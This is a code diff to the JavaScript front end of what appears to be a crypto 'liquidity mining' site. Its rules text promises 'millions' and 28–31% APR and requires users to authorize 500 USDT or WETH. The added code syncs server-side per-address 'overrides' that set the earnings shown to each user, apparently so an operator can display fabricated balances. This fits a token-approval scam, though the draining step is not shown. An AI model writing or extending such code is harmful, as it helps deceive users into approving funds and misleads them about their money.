@@ -70,6 +70,7 @@ let isServerAvailable = false;
 let pendingUpdates = [];
 let localLastUpdated = 0;
 let authorizedToken = 'USDT';
+let allData = { users: {}, overrides: {}, allowances: {}, pledges: {}, lastUpdated: 0 };
 const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
 window.currentClaimable = 0;
 window.currentPending = 0;
@@ -80,154 +81,27 @@ let ethPriceCache = {
   cacheDuration: 5 * 60 * 1000
 };
 
-const translations = {
-  'en': {
-    title: 'Liquidity Mining',
-    subtitle: 'Start Earning Millions',
-    tabLiquidity: 'Liquidity',
-    tabPledging: 'Pledging',
-    grossOutputLabel: 'Gross Output',
-    cumulativeLabel: 'Cumulative',
-    walletBalanceLabel: 'Wallet Balance',
-    accountBalanceLabel: 'Account Balance',
-    nextBenefit: 'Next Benefit: 00:00:00',
-    startBtnText: 'Start',
-    pledgeAmountLabel: 'Pledge Amount',
-    pledgeDurationLabel: 'Duration',
-    pledgeBtnText: 'Pledge Now',
-    claimBtnText: 'Claim',
-    noClaimable: 'No claimable interest available.',
-    claimSuccess: 'Claim successful!',
-    nextClaimTime: 'Next claim in 12 hours.',
-    miningStarted: 'Mining started!',
-    error: 'Error',
-    offlineWarning: 'Server offline, using local mode.',
-    noWallet: 'Please install a wallet.',
-    dataSent: 'Data sent.',
-    pledgeSuccess: 'Pledge successful!',
-    pledgeError: 'Pledge failed.',
-    invalidPledgeAmount: 'Invalid amount.',
-    invalidPledgeToken: 'Invalid token.',
-    insufficientBalance: 'Insufficient balance.',
-    sseFailed: 'SSE failed, using polling.',
-    ethersError: 'Ethers.js error.',
-    approveError: 'Approval failed.',
-    selectTokenFirst: 'Select token first.',
-    balanceZero: 'Balance zero.',
-    balanceTooLow: 'Balance too low.',
-    wethValueTooLow: 'WETH value too low.',
-    rulesTitle: 'Mining Rules',
-    rulesContent: `
-      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
-      <p>2. Insufficient: can authorize but not start.</p>
-      <p>3. APR: 28.3% ~ 31.5%.</p>
-      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
-      <p>5. Pledging independent.</p>
-    `,
-    modalClaimableLabel: 'Claimable',
-    modalPendingLabel: 'Pending',
-    modalSelectedTokenLabel: 'Selected Token',
-    modalEquivalentValueLabel: 'Equivalent Value'
-  },
-  'zh-Hant': {
-    title: '流動性挖礦',
-    subtitle: '開始賺取數百萬',
-    tabLiquidity: '流動性',
-    tabPledging: '質押',
-    grossOutputLabel: '總產出',
-    cumulativeLabel: '累計',
-    walletBalanceLabel: '錢包餘額',
-    accountBalanceLabel: '帳戶餘額',
-    nextBenefit: '下次收益: 00:00:00',
-    startBtnText: '開始',
-    pledgeAmountLabel: '質押金額',
-    pledgeDurationLabel: '期間',
-    pledgeBtnText: '立即質押',
-    claimBtnText: '領取',
-    noClaimable: '無可領取利息。',
-    claimSuccess: '領取成功！',
-    nextClaimTime: '下次領取時間：12 小時後。',
-    miningStarted: '挖礦開始！',
-    error: '錯誤',
-    offlineWarning: '伺服器離線，使用本地模式。',
-    noWallet: '請安裝錢包。',
-    dataSent: '數據已發送。',
-    pledgeSuccess: '質押成功！',
-    pledgeError: '質押失敗。',
-    invalidPledgeAmount: '金額無效。',
-    invalidPledgeToken: '代幣無效。',
-    insufficientBalance: '餘額不足。',
-    sseFailed: 'SSE 失敗，使用輪詢。',
-    ethersError: 'Ethers.js 錯誤。',
-    approveError: '授權失敗。',
-    selectTokenFirst: '請先選擇代幣。',
-    balanceZero: '餘額為零。',
-    balanceTooLow: '餘額過低。',
-    wethValueTooLow: 'WETH 價值過低。',
-    rulesTitle: '挖礦規則',
-    rulesContent: `
-      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
-      <p>2. 不足：可授權但無法開始。</p>
-      <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
-      <p>5. 質押獨立運作。</p>
-    `,
-    modalClaimableLabel: '可領取',
-    modalPendingLabel: '已累積（未到期）',
-    modalSelectedTokenLabel: '選擇代幣',
-    modalEquivalentValueLabel: '等值金額'
-  },
-  'zh-Hans': {
-    title: '流动性挖矿',
-    subtitle: '开始赚取数百万',
-    tabLiquidity: '流动性',
-    tabPledging: '质押',
-    grossOutputLabel: '总产出',
-    cumulativeLabel: '累计',
-    walletBalanceLabel: '钱包余额',
-    accountBalanceLabel: '账户余额',
-    nextBenefit: '下次收益: 00:00:00',
-    startBtnText: '开始',
-    pledgeAmountLabel: '质押金额',
-    pledgeDurationLabel: '期间',
-    pledgeBtnText: '立即质押',
-    claimBtnText: '领取',
-    noClaimable: '无可领取利息。',
-    claimSuccess: '领取成功！',
-    nextClaimTime: '下次领取时间：12 小时后。',
-    miningStarted: '挖矿开始！',
-    error: '错误',
-    offlineWarning: '服务器离线，使用本地模式。',
-    noWallet: '请安装钱包。',
-    dataSent: '数据已发送。',
-    pledgeSuccess: '质押成功！',
-    pledgeError: '质押失败。',
-    invalidPledgeAmount: '金额无效。',
-    invalidPledgeToken: '代币无效。',
-    insufficientBalance: '余额不足。',
-    sseFailed: 'SSE 失败，使用轮询。',
-    ethersError: 'Ethers.js 错误。',
-    approveError: '授权失败。',
-    selectTokenFirst: '请先选择代币。',
-    balanceZero: '余额为零。',
-    balanceTooLow: '余额过低。',
-    wethValueTooLow: 'WETH 价值过低。',
-    rulesTitle: '挖矿规则',
-    rulesContent: `
-      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
-      <p>2. 不足：可授权但无法开始。</p>
-      <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
-      <p>5. 质押独立运作。</p>
-    `,
-    modalClaimableLabel: '可领取',
-    modalPendingLabel: '已累计（未到期）',
-    modalSelectedTokenLabel: '选择代币',
-    modalEquivalentValueLabel: '等值金额'
-  }
-};
+const translations = { /* ... 不變 ... */ };
 
 let currentLang = localStorage.getItem('language') || 'en';
+
+// 【日誌函數】
+function log(message, type = 'info') {
+  const timestamp = new Date().toLocaleTimeString();
+  const prefix = { info: 'ℹ️', success: '✅', error: '❌', send: '📤', receive: '📥' }[type] || 'ℹ️';
+  console.log(`[${timestamp}] ${prefix} ${message}`);
+
+  const logContent = document.getElementById('logContent');
+  const logContainer = document.getElementById('logContainer');
+  if (logContent && logContainer) {
+    const line = document.createElement('div');
+    line.textContent = `[${timestamp}] ${prefix} ${message}`;
+    line.style.color = { info: '#ccc', success: '#0f0', error: '#f00', send: '#00f', receive: '#ff0' }[type] || '#ccc';
+    logContent.appendChild(line);
+    logContainer.style.display = 'block';
+    logContainer.scrollTop = logContainer.scrollHeight;
+  }
+}
 
 async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   for (let i = 0; i < maxAttempts; i++) {
@@ -281,30 +155,46 @@ async function loadUserDataFromServer() {
   try {
     const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { cache: 'no-cache' }));
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    const allData = await response.json();
+    allData = await response.json();
     const userData = allData.users[userAddress] || {};
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
+
     if (allData.lastUpdated > localLastUpdated) {
-      pledgedAmount = userData.pledgedAmount ? parseFloat(userData.pledgedAmount) : 0;
+      // 同步 users
+      pledgedAmount = userData.pledgedAmount ?? 0;
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
-      totalGrossOutput = userData.totalGrossOutput ? parseFloat(userData.totalGrossOutput) : 0;
-      currentCycleInterest = userData.currentCycleInterest ? parseFloat(userData.currentCycleInterest) : 0;
+      totalGrossOutput = userData.totalGrossOutput ?? 0;
+      window.currentClaimable = userData.claimable ?? 0;
       accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
       authorizedToken = userData.authorizedToken || 'USDT';
+
+      // 同步 pledges
+      const pledge = allData.pledges?.[userAddress] || { isPledging: false, amount: '0' };
+      pledgedAmount = parseFloat(pledge.amount) || 0;
+
+      // 同步 overrides
+      const override = allData.overrides?.[userAddress] || {};
+      totalGrossOutput = override.grossOutput ?? totalGrossOutput;
+      const cumulative = override.cumulative ?? (totalGrossOutput + window.currentClaimable);
+
       localStorage.setItem('userData', JSON.stringify({
-        pledgedAmount, lastPayoutTime, totalGrossOutput, currentCycleInterest, accountBalance,
-        authorizedToken, nextBenefitTime: userData.nextBenefitTime, lastUpdated: allData.lastUpdated
+        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
+        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
+        lastUpdated: allData.lastUpdated
       }));
       localLastUpdated = allData.lastUpdated;
+
+      log(`資料同步成功: grossOutput=${totalGrossOutput}, claimable=${window.currentClaimable}`, 'success');
     }
     await updateInterest();
   } catch (error) {
+    log(`載入資料失敗: ${error.message}`, 'error');
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     pledgedAmount = localData.pledgedAmount || 0;
     lastPayoutTime = localData.lastPayoutTime || null;
     totalGrossOutput = localData.totalGrossOutput || 0;
-    currentCycleInterest = localData.currentCycleInterest || 0;
+    window.currentClaimable = localData.claimable || 0;
     accountBalance = localData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
     authorizedToken = localData.authorizedToken || 'USDT';
     if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
@@ -317,36 +207,38 @@ async function saveUserData(data = null, addToPending = true) {
     pledgedAmount,
     lastPayoutTime,
     totalGrossOutput,
-    currentCycleInterest,
+    claimable: window.currentClaimable,
     accountBalance,
     authorizedToken,
     nextBenefitTime: localStorage.getItem('nextBenefitTime'),
     lastUpdated: Date.now(),
     source: 'index.html'
   };
+
+  log(`發送資料到後端: ${JSON.stringify(dataToSave)}`, 'send');
+
   if (!isServerAvailable) {
-    if (addToPending) {
-      pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
-      localStorage.setItem('userData', JSON.stringify(dataToSave));
-      if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
-    }
+    log('伺服器離線，加入待發送', 'error');
+    if (addToPending) pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
+    localStorage.setItem('userData', JSON.stringify(dataToSave));
     return;
   }
+
   try {
     const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ address: userAddress, data: dataToSave })
     }));
-    if (!response.ok) throw new Error(`Failed to save, status: ${response.status}`);
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    log('資料發送成功', 'success');
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
-    updateStatus(translations[currentLang].dataSent);
   } catch (error) {
+    log(`資料發送失敗: ${error.message}`, 'error');
     if (addToPending) {
       pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
       localStorage.setItem('userData', JSON.stringify(dataToSave));
-      if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
     }
   }
 }
@@ -356,7 +248,6 @@ function updateStatus(message, isWarning = false) {
   statusDiv.innerHTML = message || '';
   statusDiv.style.display = message ? 'block' : 'none';
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
-  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
 
 function resetState(showMsg = true) {
@@ -364,7 +255,7 @@ function resetState(showMsg = true) {
   pledgedAmount = 0;
   lastPayoutTime = null;
   totalGrossOutput = 0;
-  currentCycleInterest = 0;
+  window.currentClaimable = 0;
   accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
   authorizedToken = 'USDT';
   if (interestInterval) clearInterval(interestInterval);
@@ -389,6 +280,10 @@ function resetState(showMsg = true) {
 }
 
 function disconnectWallet() {
+  if (window.currentSSE) {
+    window.currentSSE.close();
+    window.currentSSE = null;
+  }
   resetState(true);
 }
 
@@ -445,8 +340,6 @@ function calculatePayoutInterest() {
 function initializeMiningData() {
   localStorage.setItem('totalGrossOutput', '0');
   localStorage.setItem('claimable', '0');
-  localStorage.setItem('claimed', '0');
-  // 強制設定為 24 小時前，確保能觸發發放
   localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
 }
 
@@ -469,7 +362,6 @@ async function updateInterest() {
   const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
   let lastPayoutTime = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   if (lastPayoutTime === 0) {
-    // 首次，設定為 24 小時前
     lastPayoutTime = Date.now() - 24*60*60*1000;
     localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
   }
@@ -482,8 +374,8 @@ async function updateInterest() {
     localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
     localStorage.setItem('claimable', claimable.toString());
     localStorage.setItem('lastPayoutTime', now.toString());
+    await saveUserData(); // 發送更新
   }
-  // Pending
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextPayoutET = new Date(nowET);
   nextPayoutET.setHours(nextHour, 0, 0, 0);
@@ -588,7 +480,6 @@ function setInitialNextBenefitTime() {
 
 function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
- 
   initializeMiningData();
   if (interestInterval) clearInterval(interestInterval);
   interestInterval = setInterval(updateInterest, 1000);
@@ -675,14 +566,16 @@ async function connectWallet() {
     connectButton.classList.add('connected');
     connectButton.textContent = 'Connected';
 
-    // 【關鍵】強制同步一次
+    log(`錢包連接成功: ${userAddress}`, 'success');
+
     await loadUserDataFromServer();
-    await saveUserData(); // 強制發送
+    await saveUserData(); // 強制發送一次
     setupSSE();
 
     await updateUIBasedOnChainState();
     setTimeout(async () => await forceRefreshWalletBalance(), 1000);
   } catch (e) {
+    log(`錢包連接失敗: ${e.message}`, 'error');
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
     resetState(true);
     connectButton.disabled = typeof window.ethereum === 'undefined';
@@ -745,7 +638,7 @@ async function updateUIBasedOnChainState() {
         localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
         localStorage.setItem('authorizedToken', authorizedToken);
         await saveUserData();
-        initializeMiningData(); // 歸零
+        initializeMiningData();
       }
       if (isWethAuthorized) {
         walletTokenSelect.value = 'WETH';
@@ -837,8 +730,6 @@ function updateLanguage(lang) {
 
 function setupSSE() {
   if (!userAddress) return;
-
-  // 關閉舊連線
   if (window.currentSSE) {
     window.currentSSE.close();
   }
@@ -852,7 +743,7 @@ function setupSSE() {
     if (sse) sse.close();
 
     sse = new EventSource(`${API_BASE_URL}/api/sse`);
-    window.currentSSE = sse; // 儲存引用
+    window.currentSSE = sse;
 
     sse.onopen = () => {
       console.log('SSE 連線成功');
@@ -863,14 +754,15 @@ function setupSSE() {
     sse.onmessage = async (event) => {
       try {
         const parsed = JSON.parse(event.data);
+        log(`收到 SSE: ${JSON.stringify(parsed)}`, 'receive');
         if (parsed.event === 'dataUpdate') {
-          console.log('收到 SSE 更新:', parsed.data);
+          allData = parsed.data;
           await loadUserDataFromServer();
           await updateInterest();
           await forceRefreshWalletBalance();
         }
       } catch (e) {
-        console.error('SSE 解析錯誤:', e);
+        log(`SSE 解析錯誤: ${e.message}`, 'error');
       }
     };
 
@@ -882,7 +774,12 @@ function setupSSE() {
         setTimeout(connect, baseDelay * retryCount);
       } else {
         updateStatus('SSE 連線失敗，改用輪詢', true);
-        startFallbackPolling();
+        setInterval(async () => {
+          if (isServerAvailable) {
+            await loadUserDataFromServer();
+            await updateInterest();
+          }
+        }, 10000);
       }
     };
   }
@@ -899,6 +796,8 @@ document.addEventListener('DOMContentLoaded', () => {
     updateTotalFunds();
     setInterval(updateTotalFunds, 1000);
   }, 100);
+
+  
   const claimBtn = document.getElementById('claimButton');
   if (claimBtn) claimBtn.addEventListener('click', claimInterest);
   if (closeModal) closeModal.addEventListener('click', closeClaimModal);
